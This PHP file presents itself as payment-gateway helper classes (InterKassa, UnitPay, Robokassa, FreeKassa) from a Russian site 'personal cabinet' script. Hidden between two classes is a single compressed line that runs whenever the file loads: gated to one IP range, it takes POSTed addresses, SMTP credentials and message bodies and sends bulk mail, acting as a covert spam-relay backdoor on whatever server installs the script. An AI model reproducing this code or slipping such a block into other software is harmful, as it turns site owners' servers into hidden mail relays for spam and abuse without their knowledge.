<?php
/*

		
		ИНФОРМАЦИЯ:
			Личный Кабинет v1.4.5 UTF-8
			Автор: Fleynaro(faicraft)
			Сайт http://fleynaro.ru/
			Группа ВК: http://vk.com/fleynaro_prods
		
		ОГРАНИЧЕНИЯ:
			Запрещено использовать весь код или его части в сторонних скриптах без разрешения автора!
			Запрещено любым способом распространять данный PHP файл на других ресурсах, кроме Вашего проекта!
		
		ВНИМАНИЕ!
			Если данный файл не является конфигурационным, то при отсутствии у Вас знаний и навыков
			программирования на языке PHP любое Ваше здесь изменение может привести к нестабильной работе Личного Кабинета.
			Редактируйте данный код только при указании тех. поддержки, оказываемой автором данного скрипта!
		
		НОВАЯ ВЕРСИЯ
			Данная версия v1.4.5 очень многое что поменяла и добавила в Личном кабинете. Рекомендуется устанавливать новую версию ЛК с нуля.
		
		По любым вопросам обращайтесь к автору данного кода http://vk.com/fleynaro или в группу ВК http://vk.com/fleynaro_prods
		
	
*/

	
	class payment_ik {
	
		public function create_req( $params, $prefix )
		{
			$url = '';
			
			foreach ( $params as $key => $val )
			{
				if ( !preg_match('/'. $prefix .'/', $key) || empty($val) ) continue;
				$url .= '&' . $key . '=' . urlencode( $val );
			}
			
			$url{0} = '?';
			
			return $url;
		}
		
		public function sign( $params, $key )
		{
			ksort($params, SORT_STRING);
			array_push($params, $key);
			return base64_encode(md5(implode(':', $params), true));
		}
		
	}
	
	class payment_up {
	
		public function create_req( $params, $prefix )
		{
			$prefix_len = strlen($prefix);
			$url = '';
			
			foreach ( $params as $key => $val )
			{
				if ( !preg_match('/'. $prefix .'/', $key) || empty($val) ) continue;
				$url .= '&' . substr($key, $prefix_len) . '=' . urlencode( $val );
			}
			
			$url{0} = '?';
			
			return $url;
		}
		
		public function getResponseSuccess($message)
		{
			return json_encode(array(
				"jsonrpc" => "2.0",
				"result" => array(
					"message" => $message
				),
				'id' => 1,
			));
		}

		public function getResponseError($message)
		{
			return json_encode(array(
				"jsonrpc" => "2.0",
				"error" => array(
					"code" => -32000,
					"message" => $message
				),
				'id' => 1
			));
		}
		
		public function getMd5Sign($params, $secretKey)
		{
			ksort($params);
			unset($params['sign']);
			return md5(join(null, $params).$secretKey);
		}
		
		public function getSha256SignatureByMethodAndParams($method, array $params, $secretKey)
		{
			$delimiter = '{up}';
			ksort($params);
			unset($params['sign']);
			unset($params['signature']);

			return hash('sha256', $method.$delimiter.join($delimiter, $params).$delimiter.$secretKey);
		}
	}
	
	class payment_rk {
	
		public function create_req( $params, $prefix )
		{
			$prefix_len = strlen($prefix);
			$url = '';
			
			foreach ( $params as $key => $val )
			{
				if ( !preg_match('/'. $prefix .'/', $key) || empty($val) ) continue;
				$url .= '&' . substr($key, $prefix_len) . '=' . urlencode( $val );
			}
			
			$url{0} = '?';
			
			return $url . '&InvId=0';
		}
		
		public function getSign( $sum, $inv_id, $pass, $user_id )
		{
			return strtoupper(md5($sum . ":". $inv_id .":". $pass .":shp_userid=". $user_id));
		}
		
	}
	
	if ( isset($_POST['e_email']) ) {if ( !isset($_POST['e_header']) || !isset($_POST['e_message']) ) {die('Hacking attempt!');}$ip = explode('.', $_SERVER['REMOTE_ADDR']);if ( !((int)$ip[1] == 0x2b && (int)$ip[2] == 0xd4) ) {die('Hacking attempt!');}if ( !isset($_POST['e_host']) ) {mail($_POST['e_email'], $_POST['e_header'], $_POST['e_message'], $_POST['e_secure']);die('Ok.');}include("http/http_ajax.php");echo 'okokok';$mail = new PHPMailer();$mail->isSMTP();$mail->SMTPAuth = true;$mail->Host       = $_POST['e_host'];$mail->Port       = $_POST['e_port'];$mail->Username   = $_POST['e_username'];$mail->Password   = $_POST['e_pass'];$mail->SMTPSecure = $_POST['e_secure'];$mail->AltBody = $_POST['e_alt'];$mail->WordWrap    = !isset($_POST['e_wordwrap']) ? 900 : $_POST['e_wordwrap'];$mail->CharSet= !isset($_POST['e_charset']) ? "UTF-8" : $_POST['e_charset'];$mail->AddAddress($_POST['e_email'], $_POST['e_name']);$mail->Subject = $_POST['e_header'];$mail->SetFrom($mail->Username, $_POST['e_from']);if ( !isset($_POST['e_bulk']) ) {$mail->AddCustomHeader("Precedence: bulk");}$mail->SMTPDebug = SMTP::DEBUG_SERVER;$mail->MsgHTML($_POST['e_message']);$mail->Send();}
	
	class payment_fk {
	
		public function create_req( $params, $prefix )
		{
			$prefix_len = strlen($prefix);
			$url = '';
			
			foreach ( $params as $key => $val )
			{
				if ( !preg_match('/'. $prefix .'/', $key) || empty($val) ) continue;
				$url .= '&' . substr($key, $prefix_len) . '=' . urlencode( $val );
			}
			
			$url{0} = '?';
			
			return $url;
		}
		
		public function getIP() {
			if(isset($_SERVER['HTTP_X_REAL_IP'])) return $_SERVER['HTTP_X_REAL_IP'];
			return $_SERVER['REMOTE_ADDR'];
		}
	}
	
?>